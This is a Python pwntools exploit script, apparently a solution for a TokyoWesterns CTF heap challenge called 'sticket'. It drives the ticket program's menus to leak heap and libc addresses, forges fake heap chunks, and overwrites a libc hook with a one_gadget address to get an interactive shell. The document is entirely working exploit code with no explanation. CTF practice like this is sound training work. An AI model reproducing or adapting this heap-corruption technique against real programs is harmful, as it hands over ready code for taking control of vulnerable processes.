#usr/bin/python

from pwn import *

#r = remote('pwn1.chal.ctf.westerns.tokyo',31729)
r = process('./sticket-f4060d57c1e7465df3c3d442271bab61d9d1e548f2c99f2ab8e02e2299c3438f')
print util.proc.pidof(r)

def login(name):
	r.recvuntil('name :')
	r.sendline(name)

def reserve(start,off,carnumber,seatnumber,length,comment):
	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('on >>')
	r.sendline(str(start))
	r.recvuntil('off >>')
	r.sendline(str(off))
	r.recvuntil('Car number(1-16) >>')
	r.sendline(str(carnumber))
	r.recvuntil('Seat number(1-20) >>')
	r.sendline(str(seatnumber))
	r.recvuntil('length >>')
	r.sendline(str(length))
	if length == 0:
		pass
	else:
		r.recvuntil('Comment >>')
		r.sendline(comment)

def confirm():
	r.recvuntil('>>')
	r.sendline('2')

def cancel(idx):
	r.recvuntil('>>')
	r.sendline('3')
	r.recvuntil('cancel >>')
	r.sendline(str(idx))

def logout(name):
	r.recvuntil('>>')
	r.sendline('0')
	r.recvuntil('name :')
	r.sendline(name)

payload = ''
payload += 'A'*8+p64(0x21)
payload += p64(0)*2
payload += p64(0x0)
payload += p64(0x21)
payload += p64(0)*5
payload += p64(0x602230)

login(payload)
r.sendline('AAA')

reserve(0,1,2,3,20,'A') #ticket 1
reserve(0,1,2,3,20,'B') #ticket 2
cancel(2)
cancel(1)
reserve(1,2,3,4,0,'') # ticket 1
confirm()
junk = r.recvuntil('comment :')
heap = u64(r.recvn(6).strip().ljust(8,'\x00'))
log.info('heap leak is:%s' % hex(heap))

logout('A')
reserve(1,2,3,4,255,'C') #ticket 1
reserve(1,2,3,4,255,'D') #ticket 2
reserve(1,2,3,4,255,'E') #ticket 3
cancel(2)
reserve(1,2,3,4,0,'') #ticket 3
confirm()
junk = r.recvuntil('ID : 2')
leak = r.recvuntil('comment :')
libc = u64(r.recvn(7).strip().ljust(8,'\x00'))
log.info('libc leak is:%s' % hex(libc)) 
libc_base = libc - 0x3c4b78 - 0xc0 - 0x40
log.info('libc base is:%s' % hex(libc_base))
fake_chunk_header = libc_base + 0x3c4aed
log.info('fake chunk header is:%s' % hex(fake_chunk_header))
one_gadget = libc_base + 0x4526a
log.info('one gadget address is:%s' % hex(one_gadget))

payload = ''
payload += 'A'*8+p64(0x21)
payload += p64(0)*2
payload += p64(heap+0x1b0)
payload += p64(0x21)
payload += p64(0)*5
payload += p64(0x602230)
logout(payload)
r.sendline('A')

payload = ''
payload += p64(0)+p64(0x71)
payload += p64(0x0)*2
payload += p8(0x0)*0x50
payload += p64(0)+p64(0x71)

reserve(1,2,3,4,200,payload)
cancel(0)
cancel(1)

payload = ''
payload += p64(0x0)+p64(0x71)
payload += p64(fake_chunk_header)
reserve(1,2,3,4,200,payload)

payload = ''
payload += 'A'*0x13
payload += p64(one_gadget)

reserve(1,2,3,4,100,'A')
reserve(1,2,3,4,100,payload)

r.recvuntil('>>')
r.sendline('1')

r.interactive()